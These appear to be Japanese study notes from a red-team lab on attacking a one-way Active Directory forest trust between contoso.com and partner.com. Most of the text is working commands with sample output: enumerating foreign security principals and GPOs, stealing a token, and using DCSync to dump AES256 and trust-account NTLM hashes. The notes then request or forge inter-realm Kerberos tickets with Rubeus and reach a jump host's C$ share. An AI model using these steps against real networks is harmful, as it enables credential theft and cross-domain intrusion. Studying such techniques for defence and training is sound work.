**一方向トラスト**は、管理者がリソースをTrusted domain（信頼される側）と共有したいがTrusting domain（信頼する側）からは自分のリソースにアクセスさせたくない場合に構成

TDOを参照してinbound transitive forest trustを確認
```bash
getuid
# 出力例
[*] You are CONTOSO\pchilds

ldapsearch (objectClass=trustedDomain)
# 出力例
name: partner.com
trustDirection: 1
trustAttributes: 8
flatName: PARTNER
```

- trustDirection 1 is TRUST_DIRECTION_INBOUND
- trustAttributes 8 is TRUST_ATTRIBUTE_FOREST_TRANSITIVE

攻撃者がTrusted Domain内にいる場合はTrusting Domainのリソースにアクセス可能

攻撃方法
Trusting Domainのリソースへのアクセス権を持つプリンシパルを見つけて成りすます。
# 悪用方法
ADにはForeign Security Principals Containerというコンテナオブジェクトがある
（コンテナとは複数のオブジェクトをツリー構造で管理できフォルダみたいなもの）

Trusted Domain（CONTOSO.COM）のとあるグループに、Trusting Domain（PARTNER.COM）のリソースへアクセスさせたい場合
Trusting DomianにTrusted Domainのプリンシパルを追加させようとすると、ADはTrusting Domain内に`ForeingSecurityPrincipal`オブジェクトを生成する。（SIDだけの参照オブジェクト)

探し方
```bash
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
# 出力
Binding to partner.com

[*] Distinguished name: DC=partner,DC=com
[*] Filter: (objectClass=foreignSecurityPrincipal)
[*] Scope of search value: 3
[*] Returning specific attribute(s): cn,memberOf

--------------------
cn: S-1-5-4
--------------------
cn: S-1-5-11
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=partner,DC=com, CN=Users,CN=Builtin,DC=partner,DC=com
--------------------
cn: S-1-5-17
--------------------
cn: S-1-5-9
--------------------
cn: S-1-5-21-3926355307-1661546229-813047887-6102
memberOf: CN=Contoso Users,CN=Users,DC=partner,DC=com
retreived 5 results total
```

`S-1-5-21-3926355307-1661546229-813047887-6102`がTrusted Domainに存在するSID

SIDを参照
```bash
ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)
# 出力例
--------------------
objectClass: top, group
cn: Partner Jump Users
member: CN=Polly Childs,CN=Users,DC=contoso,DC=com
distinguishedName: CN=Partner Jump Users,CN=Users,DC=contoso,DC=com
name: Partner Jump Users
objectSid: S-1-5-21-3926355307-1661546229-813047887-6102
sAMAccountName: Partner Jump Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=contoso,DC=com
```

つまりcontoso.com の Partner Jump Users = partner.com の Contoso Users のメンバーであることわかる
このドメインはForeignUserに対してPARTNER.COM内の権限を割り当てるために使用される。

「ユーザーまたはグループ」かつ「Partner Jump Users のメンバー」を確認
rsteelがメンバ
```bash
ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
# 出力例
[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))
[*] Scope of search value: 3
[*] Returning specific attribute(s): distinguishedName

--------------------
distinguishedName: CN=Robert Steel,CN=Users,DC=contoso,DC=com
retreived 1 results total
```

partner.comのドメインコントローラを探す
AD は DC の場所を DNS の SRV レコードに自動登録する
```
nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
```

| 部分                                 | 意味                        |
| ---------------------------------- | ------------------------- |
| `nslookup`                         | DNS 照会コマンド                |
| `_ldap._tcp.dc._msdcs.partner.com` | AD が DC を登録する特殊な DNS レコード |
| `10.10.120.1`                      | 照会先の DNS サーバー             |
| `SRV`                              | SRV レコードを検索               |
partner.comのGPOを列挙
GPO には**どのユーザー・グループがどのマシンにアクセスできるか**という設定が含まれる
```bash
ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath

# 出力例
~
displayName: Contoso Jump Users
gPCFileSysPath: \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}
retreived 6 results total
```

Contoso Jump UsersのgPCFileSysPath(**GPO の設定ファイルが実際に置いてある SYSVOL 上のパス**を示す AD 属性)を使ってSYSVOLを直接参照
```
download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```

View -> Downloads -> ファイルを指定 -> Sync FilesボタンでDesktopファイルに置く。-> メモ帳で確認
![[images/Pasted image 20260523162938.png]]
S-1-5-21~1104というユーザorグループがローカルアドミンであることが分かる

S-1-5-21~1104を検索するContoso Usersグループであることが分かる。S-1-5-21-3926355307-1661546229-813047887-6102はPartner Jump Usersなので、
```bash
ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes

# 出力
~
--------------------
member: CN=S-1-5-21-3926355307-1661546229-813047887-6102,CN=ForeignSecurityPrincipals,DC=partner,DC=com
sAMAccountName: Contoso Users
sAMAccountType: 536870912
retreived 1 results total
```

GPOがどのOUまたはドメインにリンクされているか確認（GPOが適用されてるのはどのOUが以下のコンピュータか確認）
GPO `{DFE606B4...}` は **OU ではなくドメイン直下にリンクされている**。partner.com 内の全コンピュータに適用されているということ
```bash
ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name

# 出力例
--------------------
objectClass: top, domain, domainDNS
name: partner
retreived 1 results total
```

partner.com ドメインに存在するコンピューターアカウントを列挙
```
ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com
```

## Ptt(2通り)
### 正規のクレデンシャルを使ってアクセスする場合
プロセスからドメインアドミンのトークン
```
steal_token 4104
```

DCSyncで目的のユーザのパスワードハッシュ(aes256)をダンプ
```
dcsync contoso.com CONTOSO\rsteel
```

contoso.comのrsteelのTGTを取得
```
krb_asktgt /user:rsteel /aes256:ハッシュ
```

partner.com へのinter-realm referral ticketsを取得
```
krb_asktgs /service:krbtgt/partner.com /ticket:TGT
```

PAR-JMP-1 の CIFS サービスチケット取得
```
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:INTER-REALM
```

サービスチケットダンプ
```powershell
[IO.File]::WriteAllBytes("Path",[Convert]::FromBase64String("TGS"))
```

使用する用のトークン
```
make_token CONTOSO\rsteel FakePass
```

使用
```
kerberos_ticket_use C:\Users\Attacker\Desktop\jmp-cifs.kirbi
```

cifsにアクセス
```
ls \\par-jmp-1.partner.com\c$
```
### Forging referral ticketsの場合
inter-realm keyを使用してinter-realm referral ticketsを偽造することも可能
```
dcsync contoso.com CONTOSO\PARTNER$
```

NTLMハッシュを使用してRubeusのsilverコマンドで偽造
トラストは現代のwindowsでもデフォルトでRC4暗号化を使用するためNTLMハッシュ
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
```
各パラメータの意味：

| パラメータ      | 説明                                                                                        |
| ---------- | ----------------------------------------------------------------------------------------- |
| `/user`    | なりすますユーザー名                                                                                |
| `/domain`  | トラステッドドメインの FQDN                                                                          |
| `/sid`     | トラステッドドメインの SID                                                                           |
| `/id`      | なりすますユーザーの RID                                                                            |
| `/groups`  | なりすますユーザーのドメイングループの RID（Domain Users=513、Workstation Admins=1106、Partner Jump Users=6102） |
| `/service` | トラスティングドメインの krbtgt サービス                                                                  |
| `/rc4`     | インタレルムキー                                                                                  |
偽造したinter-realm TGTを使用してtrusting domainのサービスチケットを取得
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:doIFM[...snip...]mNvbQ== /nowrap
```